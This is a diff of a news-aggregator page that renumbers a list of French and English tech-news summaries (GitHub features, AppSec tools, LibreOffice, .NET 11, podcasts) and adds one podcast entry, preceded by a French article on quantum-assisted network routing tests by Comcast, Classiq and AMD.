 Comcast, Classiq et AMD mènent des tests pour améliorer le trafic Internet en utilisant des algorithmes quantiques pour renforcer la résistance du routage réseau. "L’essai conjoint s’est concentré sur un défi clé de la conception des réseaux : identifier des chemins de secours indépendants pour les nœuds du réseau lors des opérations de maintenance ou de modifications. L’objectif était de garantir que, si un site est mis hors ligne et que soudainement, un deuxième tombe en panne, le trafic puisse être redirigé sans interruption ni dégradation du service pour les clients. Pour y parvenir, les opérateurs doivent identifier des chemins de secours distincts, rapides et capables de résister à des pannes simultanées, tout en minimisant la latence. Cette tâche devient de plus en plus complexe à mesure que le réseau s’étend." explique l'annonce. Le schéma présente le design et l'implémentation du flux et de l'algo quantique sur la plateforme Classiq. L’expérimentation a combiné des techniques de calcul quantique et des méthodes classiques haute performance afin d’évaluer la capacité des algorithmes quantiques à identifier, en temps réel, des chemins de secours dans des scénarios de gestion des changements. Elle a été menée à la fois sur du matériel quantique et dans des environnements de simulation accélérés utilisant des GPU AMD Instinct, afin d’atteindre une capacité de calcul (à l’échelle des qubits) encore hors de portée du matériel quantique seul.
 « L’avenir du calcul repose sur la convergence entre le classique et le quantique », explique Madhu Rangarajan, vice-président corporate en charge des produits Compute et Enterprise AI chez AMD. « En tant qu’acteur du calcul haute performance, nous cherchons à comprendre nos technologies peuvent accompagner l’émergence du quantique. Cette collaboration montre un cas concret où la simulation accélérée et l’exécution quantique sont combinées pour répondre à un enjeu opérationnel réel dans les réseaux. »
@@ -11454,7 +11528,7 @@ Détail sur l'algo quantique utilisé : https://www.amd.com/en/developer/resour
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Changelog">
 
-### 50. `EN` [Enterprise-wide credential management tools for incident response](data/articles/22cbafe0150ce7daee5646482fdaf55e.html)
+### 51. `EN` [Enterprise-wide credential management tools for incident response](data/articles/22cbafe0150ce7daee5646482fdaf55e.html)
 **Source:** GitHub Changelog | **Keyword:** `Features`
 Enterprise owners can now use new credential management actions to respond decisively to high-impact security incidents in their GitHub Enterprise Cloud enterprise accounts. These new capabilities are available for enterprise…
 
@@ -11462,7 +11536,7 @@ Enterprise owners can now use new credential management actions to respond decis
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Changelog">
 
-### 51. `EN` [MCP Registry and more improvements in Copilot in Eclipse](data/articles/855b14d71b0aeac839605b64f27e873d.html)
+### 52. `EN` [MCP Registry and more improvements in Copilot in Eclipse](data/articles/855b14d71b0aeac839605b64f27e873d.html)
 **Source:** GitHub Changelog | **Keyword:** `Features`
 We’ve just shipped a new set of improvements to make GitHub Copilot in Eclipse smarter and easier to use. These updates bring more context options, smoother workflows, and better customization…
 
@@ -11470,7 +11544,7 @@ We’ve just shipped a new set of improvements to make GitHub Copilot in Eclipse
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Changelog">
 
-### 52. `EN` [Required reviewer rule is now generally available](data/articles/85795ccda195b7d5e7d3415614954b9d.html)
+### 53. `EN` [Required reviewer rule is now generally available](data/articles/85795ccda195b7d5e7d3415614954b9d.html)
 **Source:** GitHub Changelog | **Keyword:** `Features`
 The required reviewer rule for repository rulesets is now generally available, giving you granular control over who must approve changes to specific branches and files across your organization or enterprise.…
 
@@ -11478,7 +11552,7 @@ The required reviewer rule for repository rulesets is now generally available, g
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Changelog">
 
-### 53. `EN` [Custom properties and rule insights improvements](data/articles/01e839a5fb1d5471308e2a649d3bd032.html)
+### 54. `EN` [Custom properties and rule insights improvements](data/articles/01e839a5fb1d5471308e2a649d3bd032.html)
 **Source:** GitHub Changelog | **Keyword:** `Features`
 We’ve shipped two improvements to help you enforce repository policies and gain better visibility into rule activity across your organization. Custom properties now support required explicit values Organization and enterprise…
 
@@ -11486,7 +11560,7 @@ We’ve shipped two improvements to help you enforce repository policies and gai
 
 <div class="article-item" data-lang="fr" data-category="opensource" data-source="Programmez">
 
-### 54. `FR` [IDE Kiro : Checkmarx apporte plus de sécurité applicative](data/articles/c44afab755f22647642c2bb2392a9147.html)
+### 55. `FR` [IDE Kiro : Checkmarx apporte plus de sécurité applicative](data/articles/c44afab755f22647642c2bb2392a9147.html)
 **Source:** Programmez | **Keyword:** `Developpement`
 Checkmarx annonce que son Developer Assist supporte l'IDE Kiro, pour l'étendre la sécurité applicative directement dans l'enviornnement. Cette intégration permet à ces derniers d'identifier et de résoudre les problèmes de sécurité au fil de l'écriture du code, sans quitter leur IDE ni dépendre de scans en aval dans la chaîne CI/CD.
 En utilisant l’extension IDE officielle de Checkmarx, les développeurs peuvent activer Developer Assist dans Kiro en quelques étapes seulement, sans configuration lourde. La prise en charge d’autres flux de développement, y compris via la ligne de commande, sera bientôt disponible. Une fois authentifié, Developer Assist analyse automatiquement le code source et les dépendances de l’espace de travail actif, appliquant les politiques existantes de Checkmarx One. Aucune configuration spécifique à Kiro, API propriétaire ou intégration expérimentale n’est nécessaire. Developer Assist est disponible sur Cursor, Visual Studio Code et Windsurf.
@@ -11496,7 +11570,7 @@ Pour en savoir plus : https://dev.checkmarx.com/ Catégorie actualité: Outils 
 
 <div class="article-item" data-lang="fr" data-category="opensource" data-source="Programmez">
 
-### 55. `FR` [WebMCP : un standard pour rendre un site web "agent ready" ?](data/articles/cf49797ef2daa5905e16ca166c087fec.html)
+### 56. `FR` [WebMCP : un standard pour rendre un site web "agent ready" ?](data/articles/cf49797ef2daa5905e16ca166c087fec.html)
 **Source:** Programmez | **Keyword:** `Developpement`
 concilier agents IA et sites web et la manière dont les pages web pourraient interagir, travailler avec les agents ? WebMCP veut fournir une méthode standard pour définir les actions des agents sur un site web, sur une page web sans pénaliser au bon fonctionnement du site web. "Vous indiquez aux agents et où interagir avec votre site, qu'il s'agisse de réserver un vol, de soumettre une demande d'assistance ou de naviguer dans des données complexes. Ce canal de communication direct élimine toute ambiguïté et permet des flux de travail plus rapides et plus efficaces pour les agents." expliquer Google. WebMCP preview repose sur 2 API :
 - API déclarative : Permet d’effectuer des actions standard définies directement dans les formulaires HTML. - API impérative : Permet d’effectuer des interactions plus complexes et dynamiques nécessitant l’exécution de JavaScript. C'est une interface proposé en preview par Google et accessible dans Chrome. Ces API forment un "pont" rendant votre site web "agent ready" et permet de créer des flux agentiques que se veulent plus fiables qu'en passant par du DOM. Ces API sont JavaScript. Pour le moment, la spécification est en cours de rédaction. Elle ne dépend pas de W3C et n'est pas un standard du consortium. Site : https://webmachinelearning.github.io/webmcp/ Catégorie actualité: IA MCP Image actualité AMP:
@@ -11505,7 +11579,7 @@ concilier agents IA et sites web et la manière dont les pages web pourraient in
 
 <div class="article-item" data-lang="fr" data-category="opensource" data-source="LinuxFr">
 
-### 56. `FR` [Parcours libriste d’Isabella Vanni — « Libre à vous ! » du 10 février 2026 — Podcasts et références](data/articles/22e17fe8f975d8b14b500193845288b4.html)
+### 57. `FR` [Parcours libriste d’Isabella Vanni — « Libre à vous ! » du 10 février 2026 — Podcasts et références](data/articles/22e17fe8f975d8b14b500193845288b4.html)
 **Source:** LinuxFr | **Keyword:** `France`
 268ème émission « Libre à vous ! » de l’April. Podcast et programme :
 sujet principal : parcours libriste d’Isabella Vanni, coordinatrice vie associative et responsable projets à l’April. Un parcours libriste est l’interview d’une seule personne pour parler de son parcours personnel et professionnel
@@ -11522,7 +11596,7 @@ lien nᵒ 6 : Radio Cause Commune Rendez‐vous en direct chaque mardi de 15 
 
 <div class="article-item" data-lang="fr" data-category="opensource" data-source="Programmez">
 
-### 57. `FR` [.Net 11 Preview 1 : nouvelles librairies, peu de changements dans C#](data/articles/37ed40d4ebc110a4614a0e84996bc9bd.html)
+### 58. `FR` [.Net 11 Preview 1 : nouvelles librairies, peu de changements dans C#](data/articles/37ed40d4ebc110a4614a0e84996bc9bd.html)
 **Source:** Programmez | **Keyword:** `Developpement`
 .Net 10 a été distribuée en novembre 2025. La version 11 est désormais disponible en preview 1. Comme à chaque fois, de nombreuses évolutions sont attendues. L'ensemble des frameworks et des langages sont concernées : C#, F#, ASP.Net Core, Blazor, MAUI, le compilateur Jit, le support de CoreCLR dans WebAssembly, meilleure compression / décompression avec Zstandard. Sur la partie librairie, retenons déjà les évolutions suivantes :
 - Zstandard est natif à .Net pour la compression. La librairie promet une nette amélioration des performances :
@@ -11545,7 +11619,7 @@ La génération de source XAML est par défaut pour les applications .Net MAUI, 
 
 <div class="article-item" data-lang="fr" data-category="opensource" data-source="Programmez">
 
-### 58. `FR` [Snyk lance AI Security Fabric pour le SDLC](data/articles/a99d46ed4d547ba7aa38d5a6e0828952.html)
+### 59. `FR` [Snyk lance AI Security Fabric pour le SDLC](data/articles/a99d46ed4d547ba7aa38d5a6e0828952.html)
 **Source:** Programmez | **Keyword:** `Developpement`
 Ai Security Fabric est la nouvelle solution de l'éditeur Snyk. Cette plateforme s'insère dans le cycle de vie du développement logiciel, SDLC. Elle permet aux entreprises de commercialiser des logiciels basés sur l'IA en toute sécurité et à la vitesse de l'IA. "Aujourd'hui, les développeurs et les concepteurs utilisent non seulement l'IA pour écrire du code et alimenter des applications, mais ils sont également confrontés à une augmentation rapide des cybermenaces liées à l'IA. Ce système aide les entreprises à réduire les risques cumulés sans ralentir l'innovation. L'augmentation de la dette de sécurité, les nouveaux vecteurs d'attaque et le manque de gouvernance dans le développement basé sur l'IA aggravent les risques sur une surface d'attaque en constante expansion. Alors que l'infrastructure IA devient la trame de l'informatique moderne, les entreprises ont besoin d'une trame de sécurité qui assure une protection continue, et non ponctuelle." explique l'éditeur.
 L'outil est donc là pour sécuriser tous les développements IA, les agents, etc. Snyk a identifié trois défis que l’AI Security adresse : Les vulnérabilités apparaissent à un rythme plus rapide : le volume de code explose en raison de l'adoption rapide des pratiques de codage assistées par l'IA. La sécurité doit aller au-delà de l'analyse réactive pour être « sécurisée dès le départ », en stoppant le flux de nouvelles vulnérabilités qui contribuent à l'augmentation des retards en matière de sécurité.
@@ -11563,7 +11637,7 @@ Sécurité agentique : le prototype MCP-Scan de Snyk Labs exploite l'analyse de
 
 <div class="article-item" data-lang="fr" data-category="opensource" data-source="Programmez">
 
-### 59. `FR` [Armis : l'AppSec au défi du code généré par l'IA](data/articles/81e716fd7020fe921afa42a34d011a8a.html)
+### 60. `FR` [Armis : l'AppSec au défi du code généré par l'IA](data/articles/81e716fd7020fe921afa42a34d011a8a.html)
 **Source:** Programmez | **Keyword:** `Developpement`
 L'éditeur en sécurité Armis annonce Centrix pour la sécurité applicative. Le paysage actuel de la sécurité applicative est saturé de solutions fragmentées et statiques, chacune résolvant un morceau du problème mais générant du bruit, des inefficacités et des angles morts. Basée sur IA, Armis Centrix for Application Security détecte les failles dans le code, contextualise ces failles en les reliant à l’environnement réel d’exécution et automatise la remédiation. Elle intègre pleinement l’infrastructure ainsi que le pipeline CI/CD et prend en compte les contrôles de mitigation en production. Armis simplifie la gestion des risques et permet aux équipes de sécurité de prioriser leurs actions pour protéger l’ensemble de la chaîne logicielle.
 « Avec le codage assisté par l’IA, les développeurs accélèrent leurs livraisons… mais peuvent tout aussi rapidement introduire des vulnérabilités. Les équipes de sécurité doivent donc réagir au même rythme et à la même échelle. » poursuit Katie Norton, Responsable Recherche, DevSecOps et Sécurité de la chaîne d’approvisionnement logicielle chez IDC. « Grâce à son scan natif IA, sa vision contextuelle de l’ensemble de la plateforme et sa validation indépendante, Armis Centrix permet aux équipes de sécurité de rester en phase avec cette nouvelle ère du développement IA. » L'éditeur affirme réduire les faux positifs de 70 % et améliore notablement le temps moyen de résolution en automatisant la correction. La solution assure la couverture complète du code source à la production. Pour en savoir plus : https://www.armis.com/platform/armis-centrix-for-application-security/ Catégorie actualité: Sécurité AppSec Image actualité AMP:
@@ -11572,7 +11646,7 @@ L'éditeur en sécurité Armis annonce Centrix pour la sécurité applicative. 
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Blog">
 
-### 60. `EN` [Automate repository tasks with GitHub Agentic Workflows](data/articles/91df09eb5a9f662a62dc66bd76a5b84e.html)
+### 61. `EN` [Automate repository tasks with GitHub Agentic Workflows](data/articles/91df09eb5a9f662a62dc66bd76a5b84e.html)
 **Source:** GitHub Blog | **Keyword:** `DevTools`
 Discover GitHub Agentic Workflows, now in technical preview. Build automations using coding agents in GitHub Actions to handle triage, documentation, code quality, and more.
 
@@ -11580,7 +11654,7 @@ Discover GitHub Agentic Workflows, now in technical preview. Build automations u
 
 <div class="article-item" data-lang="fr" data-category="opensource" data-source="Programmez">
 
-### 61. `FR` [Marché de l'emploi IT : un ralentissement mais des profils porteurs](data/articles/550f84d36859a587c6cb705c261c033b.html)
+### 62. `FR` [Marché de l'emploi IT : un ralentissement mais des profils porteurs](data/articles/550f84d36859a587c6cb705c261c033b.html)
 **Source:** Programmez | **Keyword:** `Developpement`
 En 2025, environ 230 000 offres d'emploi concernaient l'IT et la tech, selon HelloWork. Par rapport à 2024, il s'agit d'un recul de 28 %. Il ne faut pas forcément y voir une baisse de recrutement mais de nouvelles pratiques avec quelques priorités technologiques. Les dernières études de HelloWorks fournissent plusieurs stats intéressantes : 1 offre IT sur 2 est localisée en Île-de-France ou en Auvergne-Rhône-Alpes : sans grande surprise
 La baisse des recrutements concerne la plupart des régions, mais PACA (-17 %) résiste mieux
@@ -11596,7 +11670,7 @@ Technicien data center (+41 %) Les métiers et profils autour de l'IA progressen
 
 <div class="article-item" data-lang="fr" data-category="opensource" data-source="LinuxFr">
 
-### 62. `FR` [LibreOffice 26.2 : Markdown, accessibilité et plein d’autres nouveautés et améliorations](data/articles/4a3f163314f7c85cbeb59ed3f13797b0.html)
+### 63. `FR` [LibreOffice 26.2 : Markdown, accessibilité et plein d’autres nouveautés et améliorations](data/articles/4a3f163314f7c85cbeb59ed3f13797b0.html)
 **Source:** LinuxFr | **Keyword:** `France`
 En février, il y a la corvée commerciale de la Saint-Valentin et les réjouissances intellectuelles consécutives à la sortie d’une nouvelle version de la suite bureautique LibreOffice. C’est, bien évidemment, sur LibreOffice 26.2 que l’on va se pencher. Au menu, du très visible, comme les boites de dialogues, du très attendu comme la prise en compte du Markdown ou du moins visible comme le travail sur l’accessibilité.
 Il va de soi que les notes de version sont plus exhaustives et qu’il ne s’agit ici que d’une sélection. lien nᵒ 1 : Notes de version Sommaire
@@ -11657,7 +11731,7 @@ The Document Foundation ou TDF est la fondation de droit allemand qui pilote le 
 
 <div class="article-item" data-lang="fr" data-category="opensource" data-source="LinuxFr">
 
-### 63. `FR` [Projets Libres saison 4 épisode 11 : PVH éditions, une maison d'édition libérée et dans le Fediverse](data/articles/d70a6c6f40e372a575a4b71489d5ec49.html)
+### 64. `FR` [Projets Libres saison 4 épisode 11 : PVH éditions, une maison d'édition libérée et dans le Fediverse](data/articles/d70a6c6f40e372a575a4b71489d5ec49.html)
 **Source:** LinuxFr | **Keyword:** `France`
 Nous avons eu le plaisir de rencontrer Lionel Jeannerat durant les Rencontres Hivernales du libre à Saint-Cergue (VD) en janvier 2026. son parcours
 la maison d'édition et ses œuvres
@@ -11673,7 +11747,7 @@ lien nᵒ 6 : Le site des Rencontres Hivernales du libre Télécharger ce conte
 
 <div class="article-item" data-lang="fr" data-category="opensource" data-source="LinuxFr">
 
-### 64. `FR` [Les journaux LinuxFr.org les mieux notés de janvier 2026](data/articles/bea148a7cf5ddc0a595ea531cc33745d.html)
+### 65. `FR` [Les journaux LinuxFr.org les mieux notés de janvier 2026](data/articles/bea148a7cf5ddc0a595ea531cc33745d.html)
 **Source:** LinuxFr | **Keyword:** `France`
 LinuxFr.org propose des dépêches et articles, soumis par tout un chacun, puis revus et corrigés par l’équipe de modération avant publication. C’est la partie la plus visible de LinuxFr.org, ce sont les dépêches qui sont le plus lues et suivies, sur le site, via Atom/RSS, ou bien via partage par messagerie instantanée, par courriel, ou encore via médias sociaux. Ce que l’on sait moins, c’est que LinuxFr.org vous propose également de publier directement vos propres articles, sans validation a priori de lʼéquipe de modération. Ceux-ci s’appellent des journaux. Voici un florilège d’une dizaine de ces journaux parmi les mieux notés par les utilisateurs et les utilisatrices… qui notent. Lumière sur ceux du mois de janvier passé.
 « lecteur mp3 pour personne handicapée mentale » par ChocolatineFlying ;
@@ -11693,7 +11767,7 @@ lien nᵒ 3 : Proposez une dépêche Télécharger ce contenu au format EPUB : 
 
 <div class="article-item" data-lang="fr" data-category="opensource" data-source="LinuxFr">
 
-### 65. `FR` [Meilleures contributions LinuxFr.org : les primées de janvier 2026](data/articles/b57fd0beb1d6890e8e09d40814164855.html)
+### 66. `FR` [Meilleures contributions LinuxFr.org : les primées de janvier 2026](data/articles/b57fd0beb1d6890e8e09d40814164855.html)
 **Source:** LinuxFr | **Keyword:** `France`
 Nous continuons sur notre lancée de récompenser celles et ceux qui chaque mois contribuent au site LinuxFr.org (dépêches, , logo, journaux, correctifs, etc.). Vous n’êtes pas sans risquer de gagner un livre des éditions Eyrolles, ENI et D-Booker. Voici les gagnants du mois de janvier 2026 :
 Stefane Fermigier, pour sa dépêche « Appel à de la Commission "Vers des écosystèmes numériques ouverts européens" » ;
@@ -11709,7 +11783,7 @@ Linux — Maîtrisez l'administration du système — 7e édition. Certaines per
 
 <div class="article-item" data-lang="fr" data-category="opensource" data-source="LinuxFr">
 
-### 66. `FR` [L'April propose le pacte du logiciel libre à l'occasion des élections municipales et communautaires de 2026](data/articles/8c467e7848164cc335572d7312ff248f.html)
+### 67. `FR` [L'April propose le pacte du logiciel libre à l'occasion des élections municipales et communautaires de 2026](data/articles/8c467e7848164cc335572d7312ff248f.html)
 **Source:** LinuxFr | **Keyword:** `France`
 À l'occasion des élections municipales et communautaires des 15 et 22 mars 2026, l'April propose aux personnes candidates de signer le Pacte du Logiciel Libre afin de marquer leur engagement, si elles sont élues, à promouvoir et défendre une priorité aux logiciels libres et aux formats ouverts au sein de leurs collectivités.
 Le pacte du logiciel libre est une initiative de l'April qui remonte à l'élection présidentielle de 2007. À l'occasion des élections locales à venir, le pacte a évolué pour être plus représentatif des enjeux actuels.
@@ -11729,7 +11803,7 @@ Télécharger ce contenu au format EPUB : voir le flux Atom ouvrir dans le navig
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Blog">
 
-### 67. `EN` [Continuous AI in practice: What developers can automate today with agentic CI](data/articles/fc2239b1c799cdd28ac004aab6809df7.html)
+### 68. `EN` [Continuous AI in practice: What developers can automate today with agentic CI](data/articles/fc2239b1c799cdd28ac004aab6809df7.html)
 **Source:** GitHub Blog | **Keyword:** `DevTools`
 Think of Continuous AI as background agents that operate in your repository for tasks that require reasoning.
 
@@ -11737,7 +11811,7 @@ Think of Continuous AI as background agents that operate in your repository for 
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="The Changelog">
 
-### 68. `EN` [Setting Docker Hardened Images free](data/articles/a95aa5f4095d866115115b38501cb68c.html)
+### 69. `EN` [Setting Docker Hardened Images free](data/articles/a95aa5f4095d866115115b38501cb68c.html)
 **Source:** The Changelog | **Keyword:** `DevTools`
 In May of 2025, Docker launched Hardened Images, a secure, minimal, production-ready set of images. In December, they made DHI freely available and open source to everyone who builds software. On this episode, we're joined by Tushar Jain, EVP of Engineering at Docker to learn all about it.
 
@@ -11745,7 +11819,7 @@ In May of 2025, Docker launched Hardened Images, a secure, minimal, production-r
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Blog">
 
-### 69. `EN` [Pick your agent: Use Claude and Codex on Agent HQ](data/articles/b065ce914cd8e2e5f3117441da2fa6cb.html)
+### 70. `EN` [Pick your agent: Use Claude and Codex on Agent HQ](data/articles/b065ce914cd8e2e5f3117441da2fa6cb.html)
 **Source:** GitHub Blog | **Keyword:** `DevTools`
 Claude by Anthropic and OpenAI Codex are now available in public preview on GitHub and VS Code with a Copilot Pro+ or Copilot Enterprise subscription. Here's what you need to know and how to get started today.
 
@@ -11753,7 +11827,7 @@ Claude by Anthropic and OpenAI Codex are now available in public preview on GitH
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Blog">
 
-### 70. `EN` [What the fastest-growing tools reveal about how software is being built](data/articles/547cc4b2ff5bcc5d524900eafae021ac.html)
+### 71. `EN` [What the fastest-growing tools reveal about how software is being built](data/articles/547cc4b2ff5bcc5d524900eafae021ac.html)
 **Source:** GitHub Blog | **Keyword:** `DevTools`
 What languages are growing fastest, and why? What about the projects that people are interested in the most? Where are new developers cutting their teeth? Let’s take a look at Octoverse data to find out.
 
@@ -11761,7 +11835,7 @@ What languages are growing fastest, and why? What about the projects that people
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="The Changelog">
 
-### 71. `EN` [The state of homelab tech (2026)](data/articles/90d380ac119b9313e962d549fded9034.html)
+### 72. `EN` [The state of homelab tech (2026)](data/articles/90d380ac119b9313e962d549fded9034.html)
 **Source:** The Changelog | **Keyword:** `DevTools`
 Techno Tim joins Adam to dive deep into the state of homelab'ing in 2026. Hardware is scarce and expensive due to the AI gold rush, but software has never been better. From unleashing Claude on your UDM Pro to building custom Proxmox CLIs, they explores how AI is transforming what's possible in the homelab. Tim declares 2026 the "Year of Self-Hosted Software" while Adam reveals his homelab's secret weapons: DNSHole (a Pi-hole replacement written in Rust) and PXM (a Proxmox automation CLI).
 
@@ -11769,7 +11843,15 @@ Techno Tim joins Adam to dive deep into the state of homelab'ing in 2026. Hardwa
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="The Changelog">
 
-### 72. `EN` [Vite documentary companion pod](data/articles/1d8a9c21b2ed1be4662da43f34d3e40f.html)
+### 73. `EN` [Very important agents](data/articles/cc5b1a9dcccbc2f666deffaec71bc0b5.html)
+**Source:** The Changelog | **Keyword:** `DevTools`
+Nick Nisi joins us to dig into the latest trends from this year and how they're impacting his day-to-day coding and Vision Pro wearing. Anthropic's acquisition of Bun, the evolving JavaScript and AI landscape, GitHub's challenges and the Amp/Sourcegraph split. We dive into AI development practices, context management, voice assistants, Home Assistant OS and home automation, the state of the AI browser war, and we close with a prediction from Nick.
+
+</div>
+
+<div class="article-item" data-lang="en" data-category="opensource" data-source="The Changelog">
+
+### 74. `EN` [Vite documentary companion pod](data/articles/1d8a9c21b2ed1be4662da43f34d3e40f.html)
 **Source:** The Changelog | **Keyword:** `DevTools`
 Our friends at Cult.Repo launch their epic Vite documentary on October 9th, 2025! To celebrate, Jerod sat down with Evan You to discuss Vite's adoption story, why he raised money to start VoidZero, how developer documentaries get made, open source sustainability, and more.
 
